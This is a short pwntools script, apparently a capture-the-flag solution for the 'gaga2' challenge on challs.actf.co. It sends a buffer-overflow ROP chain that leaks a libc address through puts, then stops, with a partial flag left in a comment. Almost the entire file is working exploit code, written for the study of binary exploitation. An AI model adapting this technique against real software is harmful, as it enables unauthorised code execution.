from pwn import *
elf = context.binary = ELF("gaga2")
context.log_level = "DEBUG"
#p = process()
p = remote("challs.actf.co",31302)
p.recvuntil(b'Your input: ')

rop_elf = ROP(elf)
pop_rdi = rop_elf.find_gadget(["pop rdi","ret"])[0]
ret = rop_elf.find_gadget(["ret"])[0]

payload = b'A'*64
payload += p64(elf.got.gets)
payload += p64(elf.plt.gets)
payload += p64(pop_rdi)
payload += p64(elf.got.puts)
payload += p64(elf.plt.puts)
payload += p64(elf.sym._start)
payload += b"\n"
p.sendline(payload)
x = u64(p.recvline().split()[0].ljust(8, b"\x00"))
log.info(hex(x))



#p.interactive()

#actf{b4by's_f1rst_pwn!_